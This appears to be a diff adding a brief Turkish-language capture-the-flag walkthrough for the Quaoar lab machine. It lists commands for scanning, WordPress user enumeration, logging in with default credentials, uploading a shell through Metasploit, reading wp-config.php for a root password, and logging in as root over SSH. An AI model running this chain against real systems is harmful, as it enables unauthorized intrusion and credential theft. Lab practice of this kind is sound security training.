@@ -1,0 +1,8 @@
+QUAOAR MAKİNE ÇÖZÜMÜ
+1 - IP adresi makine ekranında 192.168.2.119 bulundu.
+2 - nmap -sT -A 192.168.2.119
+3 - gobuster dir -u http://192.168.2.119 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - wpscan --url http://192.168.2.119/wordpress/ -e u, admin:admin
+5 - msfconsole, use exploit/unix/webapp/wp_admin_shell_upload
+6 - cat wp-config.php, root:rootpassword!
+7 - ssh root@192.168.2.119
